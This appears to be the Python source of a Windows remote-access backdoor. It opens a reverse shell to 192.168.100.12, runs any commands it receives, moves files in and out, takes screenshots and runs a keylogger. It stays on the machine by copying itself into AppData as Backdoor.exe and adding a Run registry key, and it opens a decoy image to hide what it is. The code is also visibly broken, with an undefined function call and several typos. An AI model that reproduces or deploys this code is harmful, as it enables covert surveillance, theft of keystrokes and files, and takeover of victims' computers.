#!/usr/bin/python
import socket
import subprocess
import json
import os
import shutil
import sys
import time
import base64
import requests
import ctypes
import keylogger
import threading
from mss import mss

def nam_send(data):
    json_data = json.dumps(data)
    ramimalek.send(json_data)

def nam_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + ramimalek.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
	except:
		admin="[!!]User Privileges!"
	else:
		admin="[+]Administrator Privileges!"

has_admin()
if admin == True:
	print("Administrator Privileges")
else:
	print("User Privileges")

def download(url):
	get_response  = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def connection():
    while True:
        time.sleep(20)
        try:
            ramimalek.connect(("192.168.100.12", 54321))
            shell()
        except:
            connection()

def shell():
    while True:
        command = nam_recv()
        if command == "q":
		try:
			os.remove(keylogger_path)
		except:
			continue
            	break
	elif command == "help":
		help_options = '''download path   -> Download A file From Target PC
				  upload path     -> Upload A file To Target PC
				  get url         -> Downlad File To Target PC
				  start path      -> Start program on Target PC
				  screenshot      -> Take A Screenshot of Targets Monitor
				  check	          -> Check For Administrator Privileges 
				  keylogger_start -> Start keylogger on Target PC
				  keylog_dump     -> Print Out Keystrokes Captured By Keylogger
				  q               -> Exit The Reverse Shell '''
		nam_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:           
                os.chdir(command[3:])
            except: 
                continue 
	elif command[:8] == "download":
		with open(command[9:], "rb") as file:
			nam_send(base64.b64.b64encode(file.read()))
	elif command[:6] == "upload":
		with open(command[7:],"wb") as fin:
			result = nam_recv()
			finwrite(base64.b64decode(result))
	elif  command[:3] == "get":
		try:
			download(command[4:])
			nam_send("[+] Download File From Specified URL!")
		except:
			nam_send("[!!] Failed To Download File")
	elif command[:5] == "start":
		try:
			subprocess.Popen(command[6:], shell=true)
			nam_send("[+] Started!")
		except:
			nam_send("[!!] Failed To Start!")
	elif command[:10] == "screenshot":
		try:
			screenshot()
			with open("monitor-1.png", "rb") as sc:
				nam_send(base64.b64encode(sc.read()))
			os.remove("monitor-1.png")
		except:
			nam_send("[!!] Failed To Take Screenshot")
	elif command[:5] == "check":
		try:
			is_admin()
			nam_send(admin)
		except:
			nam_send("Can't perform the Check")
	elif command[:12] == "keylog_start":
		t1 = threading.Thread(target=keylogger.start)
		t1.start()
	elif command[:11] == "keylog_dump":	
		fn = open(keylogger_path,"r")
		nam_send(fn.read())
        else:   
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                nam_send(result)
            except:
                nam_send("[!!] Can't Execute That Command")

keylogger_path = os.environ["appdata"] + "\\keylogger.txt"
location = os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

	name = sys._MEIPASS + "\keyboard-warrior.jpg"
	try:
		subprocess.Popen(name, shell=True)
	except:
		number = 3
		number1 = 5
		addition = number + number1

ramimalek = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
ramimalek.close()


